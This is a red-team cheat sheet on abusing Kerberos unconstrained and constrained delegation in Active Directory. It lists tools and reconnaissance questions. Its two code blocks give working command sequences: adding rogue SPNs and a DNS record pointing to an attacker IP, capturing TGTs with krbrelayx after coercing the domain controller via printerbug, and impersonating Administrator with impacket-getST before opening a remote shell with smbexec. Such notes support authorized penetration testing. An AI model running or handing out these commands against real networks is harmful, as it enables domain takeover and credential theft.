# [Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations)

## Questions to ask yourself
  *  Any user/computer objects with unreadable [delegation attributes](https://github.com/SpacemanHenry/hacknotes/blob/main/Information%20Gathering/Service%20Enumeration/LDAP.md#delegation-permissions)?
  *  Any objects with delegation privileges [kerberoastable](https://github.com/SpacemanHenry/hacknotes/blob/main/Exploitation/Authentication/Kerberos/Kerberoast.md)?
  *  What services have service principal names configured?
      *  What users have high privileges over those services?

## Things to remember
  *  Unconstrained delegation requires non-default configuration for user objects
  *  Add FQDNs to `hosts` file or point to name server to avoid DNS errors
  *  All examples here [covered in Red XOR Blue blog post](https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)

## Useful tools
  *  [`krbrelayx`](https://github.com/dirkjanm/krbrelayx) toolkit for abusing unconstrained delegation
  *  [`impacket-getST`](https://github.com/fortra/impacket/blob/master/examples/getST.py) for impersonating users via constrained delegation

## Unconstrained delegation
  *  KUD service accounts are provided a TGT of any user that auths via SPN
      *  Any method of coerced authentication can often be used... get creative!
  *  `krbrelayx` for abusing user accounts with KUD (relies on [`Write servicePrincipalName`](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver16))
      *  Create evil SPNs for service account using non-existent hostname
      *  Create evil DNS record matching evil SPNs pointing to attacker IP
      *  Coerce authentication to evil SPNs and capture TGT
  *  Computer accounts with KUD are [easily abused by extracting delegated TGTs from memory](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
      *  Coerce authentication to default SPNs such as HOST/CIFS

// Unconstrained delegation abuse via service (user) account 
```
git clone https://github.com/dirkjanm/krbrelayx && cd krbrelayx
python3 addspn.py -u corp.local\\sqlsvc -p 'password' -s host/FAKE.CORP.LOCAL ldap://DC.CORP.LOCAL
python3 addspn.py -u corp.local\\sqlsvc -p 'password' -s cifs/FAKE.CORP.LOCAL ldap://DC.CORP.LOCAL
python3 dnstool.py -u corp.local\\sqlsvc -p 'password' -r FAKE.CORP.LOCAL -a add -d [ATTACKER IP] DC.CORP.LOCAL
python3 krbrelayx.py --krbsalt CORP.LOCALsqlsvc --krbpass 'password'
python3 printerbug.py corp.local/sqlsvc:'password'@DC.CORP.LOCAL FAKE.CORP.LOCAL
```

## [Constrained delegation](https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c)
  *  KCD service accounts can request TGS for a set list of services as any user
      *  Relies on [S4U extensions](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/8ee85a47-7526-4184-a7c5-25a5e4155d7d?redirectedfrom=MSDN) to support protocol transition, delegation privilege validation, etc.
      *  `impacket` suite will [attempt to modify](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/) the `sname` field when the target service doesn't match a given TGS
  *  `impacket-getST` for obtaining impersonated service tickets (not suitable for `Kerberos only` delegation)

```
impacket-getST -spn 'WWW/SERVER.corp.local' -impersonate 'Administrator' corp.local/sqlsvc:'password' -dc-ip 10.0.0.1
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-smbexec corp.local/Administrator@SERVER.corp.local -k -no-pass -dc-ip 10.0.0.1
```
